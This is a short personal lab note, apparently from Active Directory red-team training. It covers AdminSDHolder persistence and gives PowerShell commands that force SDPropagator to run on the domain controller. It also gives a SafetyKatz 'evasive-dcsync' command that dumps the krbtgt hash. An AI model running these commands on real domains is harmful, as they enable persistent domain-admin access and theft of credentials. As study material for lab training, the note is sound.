![[../../../attchments/Pasted image 20250621142921.png]]

![[../../../attchments/Pasted image 20250621143207.png]]

![[../../../attchments/Pasted image 20250621143227.png]]


![[../../../attchments/Pasted image 20250621143443.png]]

command to manual trigger the propogater

```
$Sess = New-PSSession -ComputerName dcorp-dc

Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-SDPropagator.ps1
Invoke-Command -ScriptBlock{Invoke-SDPropagator -showProgress -Verbose-timeoutMinutes
1}
-Session $sess

```


in this attck insted of adding your user to the domain admin group add it to the adminSDHolder so after an hour when it overwrites evvryprotected group your user will we added to evry protected group

![[../../../attchments/Pasted image 20250621163525.png]]

![[../../../attchments/Pasted image 20250621163552.png]]

![[../../../attchments/Pasted image 20250621163604.png]]

# DCsync attack

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump:: evasive-dcsync /user:dcorp\krbtgt"
"exit"
```

